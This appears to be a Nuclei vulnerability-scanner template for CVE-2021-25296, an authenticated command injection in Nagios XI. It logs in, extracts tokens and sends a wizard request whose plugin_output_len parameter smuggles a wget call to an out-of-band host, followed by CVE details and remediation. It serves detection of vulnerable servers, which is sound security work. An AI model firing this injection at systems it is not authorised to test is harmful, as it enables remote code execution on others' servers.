http:
- extractors:
  - group: 1
    internal: true
    name: nsp
    part: body
    regex:
    - name=['"]nsp['"] value=['"](.*)['"]>
    type: regex
  - group: 1
    internal: true
    name: nsp_auth
    part: body
    regex:
    - var nsp_str = ['"](.*)['"];
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - condition: and
    part: body_4
    type: word
    words:
    - Event Log
    - Display Name
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /nagiosxi/login.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /nagiosxi/login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    nsp={{nsp}}&pageopt=login&username={{username}}&password={{password}}

    '
  - 'GET /nagiosxi/index.php HTTP/1.1

    Host: {{Hostname}}

    '
  - '@timeout: 20s

    GET /nagiosxi/config/monitoringwizard.php?update=1&nsp={{nsp_auth}}&nextstep=3&wizard=windowswmi&check_wmic_plus_ver=1.65&ip_address=127.0.0.1&domain=127.0.0.1&username=username&password=password&plugin_output_len=9999%3bwget%20{{interactsh-url}}%3b
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-25296
info:
  author: k0pak4
  classification:
    cpe: cpe:2.3:a:nagios:nagios_xi:5.7.5:*:*:*:*:*:*:*
    cve-id: CVE-2021-25296
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-78
    epss-percentile: 0.98511
    epss-score: 0.89514
  description: 'Nagios XI 5.5.6 through 5.7.5 is susceptible to authenticated remote
    command injection. There is improper sanitization of authenticated user-controlled
    input by a single HTTP request via the file /usr/local/nagiosxi/html/includes/configwizards/windowswmi/windowswmi.inc.php.
    This in turn can lead to remote code execution, by which an attacker can execute
    malware, obtain sensitive information, modify data, and/or gain full control over
    a compromised system without entering necessary credentials.

    '
  impact: 'Successful exploitation of this vulnerability allows authenticated attackers
    to execute arbitrary commands on the target system.

    '
  metadata:
    max-request: 4
    product: nagios_xi
    shodan-query: title:"Nagios XI"
    vendor: nagios
    verified: true
  name: Nagios XI 5.5.6-5.7.5 - Authenticated Remote Command Injection
  reference:
  - https://github.com/fs0c-sh/nagios-xi-5.7.5-bugs/blob/main/README.md
  - https://github.com/rapid7/metasploit-framework/pull/17494
  - http://nagios.com
  - https://nvd.nist.gov/vuln/detail/CVE-2021-25296
  - http://packetstormsecurity.com/files/170924/Nagios-XI-5.7.5-Remote-Code-Execution.html
  remediation: 'Upgrade Nagios XI to a patched version or apply the vendor-supplied
    patch to mitigate this vulnerability.

    '
  severity: high
  tags: cve,cve2021,packetstorm,rce,oast,authenticated,msf,nagiosxi,kev,nagios
